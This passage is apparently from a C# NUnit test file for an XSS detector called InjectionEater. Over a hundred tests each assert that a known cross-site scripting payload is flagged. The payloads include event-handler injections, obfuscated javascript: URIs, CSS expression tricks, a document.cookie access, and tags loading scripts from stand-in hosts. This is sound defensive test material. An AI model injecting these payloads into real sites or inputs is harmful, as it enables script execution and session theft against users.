using System;
using NUnit.Framework;

namespace InjectionEater.t
{
    [TestFixture]
    class XSSinjection_signatures_test
    {

        [Test]
        public void XSSinject_siganture_test_xss1_founded()
        {
            string sql = @"<body oninput=javascript:alert(1)><input autofocus>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss1 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss2_founded()
        {
            string sql = @"<math href='javascript:javascript:alert(1)'>CLICKME</math> <math> <maction actiontype='statusline#http://website.com' xlink:href='javascript:javascript:alert(1)'>CLICKME</maction> </math>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss2 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss3_founded()
        {
            string sql = @"<frameset onload=javascript:alert(1)>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss3 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss4_founded()
        {
            string sql = @"<table background='javascript:javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss4 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss5_founded()
        {
            string sql = @"<!--<img src='--><img src=x onerror=javascript:alert(1)//'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss5 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss6_founded()
        {
            string sql = @"<comment><img src='</comment><img src=x onerror=javascript:alert(1))//'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss6 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss7_founded()
        {
            string sql = @"<![><img src=']><img src=x onerror=javascript:alert(1)//'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss7 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss8_founded()
        {
            string sql = @"<style><img src='</style><img src=x onerror=javascript:alert(1)//'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss8 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss9_founded()
        {
            string sql = @"<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss9 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss10_founded()
        {
            string sql = @"<head><base href='javascript://'></head><body><a href='/. /,javascript:alert(1)//#'>XXX</a></body>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss10 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss11_founded()
        {
            string sql = @"<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss11 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss12_founded()
        {
            string sql = @"<OBJECT CLASSID='clsid:333C7BC4-460F-11D0-BC04-0080C7055A83'><PARAM NAME='DataURL' VALUE='javascript:alert(1)'></OBJECT>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss12 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss13_founded()
        {
            string sql = @"<IMG SRC = 'jav&#x0D;ascript:alert('XSS');'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss13 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss14_founded()
        {
            string sql = @"perl - e 'print ' < IMG SRC = java\0script: alert('XSS')>'; ' > out";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss14 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss15_founded()
        {
            string sql = @"<b <script>alert(1)</script>0";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss15 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss16_founded()
        {
            string sql = @"<div id='div1'><input value='``onmouseover=javascript:alert(1)'></div> <div id='div2'></div><script>document.getElementById('div2').innerHTML = document.getElementById('div1').innerHTML;</script>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss16 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss17_founded()
        {
            string sql = @"<x '='foo'><x foo='><img src=x onerror=javascript:alert(1)//'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss17 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss18_founded()
        {
            string sql = @"<embed src='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss18 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss19_founded()
        {
            string sql = @"<img src='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss19 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss20_founded()
        {
            string sql = @"<image src='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss20 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss21_founded()
        {
            string sql = @"<script src='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss21 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss22_founded()
        {
            string sql = @"<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss22 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss23_founded()
        {
            string sql = @"<? foo='><script>javascript:alert(1)</script>'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss23 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss24_founded()
        {
            string sql = @"<! foo='><script>javascript:alert(1)</script>'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss24 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss25_founded()
        {
            string sql = @"</ foo='><script>javascript:alert(1)</script>'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss25 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss26_founded()
        {
            string sql = @"<? foo='><x foo='?><script>javascript:alert(1)</script>'>'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss26 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss27_founded()
        {
            string sql = @"<! foo='[[[Inception]]'><x foo=']foo><script>javascript:alert(1)</script>'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss27 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss28_founded()
        {
            string sql = @"<% foo><x foo='%><script>javascript:alert(1)</script>'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss28 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss29_founded()
        {
            string sql = @"<div id=d><x xmlns='><iframe onload=javascript:alert(1)'></div> <script>d.innerHTML=d.innerHTML</script>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss29 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss30_founded()
        {
            string sql = @"<img \x00src=x onerror='alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss30 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss31_founded()
        {
            string sql = @"<img \x47src=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss31 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss32_founded()
        {
            string sql = @"<img \x11src=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss32 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss33_founded()
        {
            string sql = @"<img \x12src=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss33 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss34_founded()
        {
            string sql = @"<img\x47src=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss34 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss35_founded()
        {
            string sql = @"<img\x10src=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss35 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss36_founded()
        {
            string sql = @"<img\x13src=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss36 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss37_founded()
        {
            string sql = @"<img\x32src=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss37 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss38_founded()
        {
            string sql = @"<img\x47src=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss38 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss39_founded()
        {
            string sql = @"<img\x11src=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss39 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss40_founded()
        {
            string sql = @"<img \x47src=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss40 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss41_founded()
        {
            string sql = @"<img \x34src=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss41 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss42_founded()
        {
            string sql = @"<img \x39src=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss42 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss43_founded()
        {
            string sql = @"<img \x00src=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss43 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss44_founded()
        {
            string sql = @"<img src\x09=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss44 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss45_founded()
        {
            string sql = @"<img src\x10=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss45 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss46_founded()
        {
            string sql = @"<img src\x13=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss46 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss47_founded()
        {
            string sql = @"<img src\x32=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss47 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss48_founded()
        {
            string sql = @"<img src\x12=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss48 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss49_founded()
        {
            string sql = @"<img src\x11=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss49 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss50_founded()
        {
            string sql = @"<img src\x00=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss50 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss51_founded()
        {
            string sql = @"<img src\x47=x onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss51 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss52_founded()
        {
            string sql = @"<img src=x\x09onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss52 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss53_founded()
        {
            string sql = @"<img src=x\x10onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss53 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss54_founded()
        {
            string sql = @"<img src=x\x11onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss54 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss55_founded()
        {
            string sql = @"<img src=x\x12onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss55 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss56_founded()
        {
            string sql = @"<img src=x\x13onerror='javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss56 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss57_founded()
        {
            string sql = @"<img[a][b]src[d]=x[e]onerror=[f]'alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss57 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss58_founded()
        {
            string sql = @"<img src=x onerror=\x09'javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss58 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss59_founded()
        {
            string sql = @"<img src=x onerror=\x10'javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss59 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss60_founded()
        {
            string sql = @"<img src=x onerror=\x11'javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss60 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss61_founded()
        {
            string sql = @"<img src=x onerror=\x12'javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss61 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss62_founded()
        {
            string sql = @"<img src=x onerror=\x32'javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss62 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss63_founded()
        {
            string sql = @"<img src=x onerror=\x00'javascript:alert(1)'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss63 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss64_founded()
        {
            string sql = @"<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss64 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss65_founded()
        {
            string sql = @"<img src='x` `<script>javascript:alert(1)</script>'` `>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss65 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss66_founded()
        {
            string sql = @"<img src onerror /' ''= alt=javascript:alert(1)//'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss66 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss67_founded()
        {
            string sql = @"<title onpropertychange=javascript:alert(1)></title><title title=>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss67 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss68_founded()
        {
            string sql = @"<a href=http://foo.bar/#x=`y></a><img alt='`><img src=x:x onerror=javascript:alert(1)></a>'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss68 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss69_founded()
        {
            string sql = @"<!--[if]><script>javascript:alert(1)</script -->";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss69 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss70_founded()
        {
            string sql = @"<!--[if<img src=x onerror=javascript:alert(1)//]> -->";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss70 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss71_founded()
        {
            string sql = @"<script src='/\%(jscript)s'></script>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss71 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss72_founded()
        {
            string sql = @"<script src='\%(jscript)s'></script>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss72 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss73_founded()
        {
            string sql = @"<object id='x' classid='clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598'></object> <object classid='clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B' onqt_error='javascript:alert(1)' style='behavior:url(#x);'><param name=postdomevents /></object>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss73 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss74_founded()
        {
            string sql = @"<a style='-o-link:'javascript:javascript:alert(1)';-o-link-source:current'>X";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss74 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss75_founded()
        {
            string sql = @"<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss75 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss76_founded()
        {
            string sql = @"<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss76 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss77_founded()
        {
            string sql = @"<style>@import 'data:,*%7bx:expression(javascript:alert(1))%7D';</style>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss77 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss78_founded()
        {
            string sql = @"<a style='pointer-events:none;position:absolute;'><a style='position:absolute;' onclick='javascript:alert(1);'>XXX</a></a><a href='javascript:javascript:alert(1)'>XXX</a>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss78 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss79_founded()
        {
            string sql = @"<IMG SRC=' &#14; javascript:alert('XSS');'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss79 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss80_founded()
        {
            string sql = @"<SCRIPT/XSS SRC='http://website.com/xss.js'></SCRIPT>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss80 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss81_founded()
        {
            string sql = @"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert('XSS')>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss81 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss82_founded()
        {
            string sql = @"<SCRIPT/SRC='http://website.com/xss.js'></SCRIPT>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss82 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss83_founded()
        {
            string sql = @"<<SCRIPT>alert('XSS');//<</SCRIPT>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss83 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss84_founded()
        {
            string sql = @"<SCRIPT SRC=http://website.com/xss.js?< B >";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss84 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss85_founded()
        {
            string sql = @"<SCRIPT SRC=//ha.ckers.org/.j>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss85 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss86_founded()
        {
            string sql = @"<IMG SRC='javascript:alert('XSS')'";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss86 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss87_founded()
        {
            string sql = @"<iframe src=http://website.com/scriptlet.html <";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss87 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss88_founded()
        {
            string sql = @"<img src=``&NewLine; onerror=alert(1)&NewLine;";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss88 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss89_founded()
        {
            string sql = @"</TITLE><SCRIPT>alert('XSS');</SCRIPT>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss89 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss90_founded()
        {
            string sql = @"<INPUT TYPE='IMAGE' SRC='javascript:alert('XSS');'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss90 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss91_founded()
        {
            string sql = @"<BODY BACKGROUND='javascript:alert('XSS')'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss91 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss92_founded()
        {
            string sql = @"<IMG DYNSRC='javascript:alert('XSS')'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss92 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss93_founded()
        {
            string sql = @"<IMG LOWSRC='javascript:alert('XSS')'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss93 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss94_founded()
        {
            string sql = @"<STYLE>li {list-style-image: url('javascript:alert('XSS')');}</STYLE><UL><LI>XSS</br>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss94 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss95_founded()
        {
            string sql = @"<IMG SRC='vbscript:msgbox('XSS')'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss95 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss96_founded()
        {
            string sql = @"<IMG SRC='livescript:'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss96 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss97_founded()
        {
            string sql = @"<BODY ONLOAD=alert('XSS')>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss97 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss98_founded()
        {
            string sql = @"<BGSOUND SRC='javascript:alert('XSS');'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss98 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss99_founded()
        {
            string sql = @"<BR SIZE='&{alert('XSS')}'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss99 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss100_founded()
        {
            string sql = @"<LINK REL='stylesheet' HREF='javascript:alert('XSS');'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss100 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss101_founded()
        {
            string sql = @"<LINK REL='stylesheet' HREF='http://website.com/xss.css'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss101 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss102_founded()
        {
            string sql = @"<STYLE>@import'http://website.com/xss.css';</STYLE>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss102 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss103_founded()
        {
            string sql = @"<META HTTP-EQUIV='Link' Content='<http://website.com/xss.css>; REL=stylesheet'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss103 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss104_founded()
        {
            string sql = @"<STYLE>BODY{-moz-binding:url('http://website.com/xssmoz.xml#xss')}</STYLE>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss104 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss105_founded()
        {
            string sql = @"<form><isindex formaction='javascript&colon;confirm(1)'";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss105 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss106_founded()
        {
            string sql = @"<IMG STYLE='xss:expr/*XSS*/ession(alert('XSS'))'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss106 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss107_founded()
        {
            string sql = @"exp/*<A STYLE='no\xss:noxss('*//*');xss:ex/*XSS*//*/*/pression(alert('XSS'))'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss107 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss108_founded()
        {
            string sql = @"<STYLE TYPE='text/javascript'>alert('XSS');</STYLE>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss108 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss109_founded()
        {
            string sql = @"<STYLE>.XSS{background-image:url('javascript:alert('XSS')');}</STYLE><A CLASS=XSS></A>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss109 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss110_founded()
        {
            string sql = @"<STYLE type='text/css'>BODY{background:url('javascript:alert('XSS')')}</STYLE>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss110 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss111_founded()
        {
            string sql = @"<STYLE type='text/css'>BODY{background:url('javascript:alert('XSS')')}</STYLE>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss111 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss112_founded()
        {
            string sql = @"<XSS STYLE='xss:expression(alert('XSS'))'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss112 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss113_founded()
        {
            string sql = @"<XSS STYLE='behavior: url(xss.htc);'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss113 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss114_founded()
        {
            string sql = @"¼script¾alert(¢XSS¢)¼/script¾";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss114 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss115_founded()
        {
            string sql = @"<META HTTP-EQUIV='refresh' CONTENT='0;url=javascript:alert('XSS');'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss115 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss116_founded()
        {
            string sql = @"<META HTTP-EQUIV='refresh' CONTENT='0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss116 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss117_founded()
        {
            string sql = @"<META HTTP-EQUIV='refresh' CONTENT='0; URL=http://;URL=javascript:alert('XSS');'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss117 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss118_founded()
        {
            string sql = @"<IFRAME SRC='javascript:alert('XSS');'></IFRAME>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss118 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss119_founded()
        {
            string sql = @"<IFRAME SRC=# onmouseover='alert(document.cookie)'></IFRAME>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss119 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss120_founded()
        {
            string sql = @"<FRAMESET><FRAME SRC='javascript:alert('XSS');'></FRAMESET>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss120 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss121_founded()
        {
            string sql = @"<TABLE BACKGROUND='javascript:alert('XSS')'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss121 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss122_founded()
        {
            string sql = @"<TABLE><TD BACKGROUND='javascript:alert('XSS')'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss122 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss123_founded()
        {
            string sql = @"<DIV STYLE='background-image: url(javascript:alert('XSS'))'>";
            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss123 fail");
        }

        [Test]
        public void XSSinject_siganture_test_xss124_founded()
        {
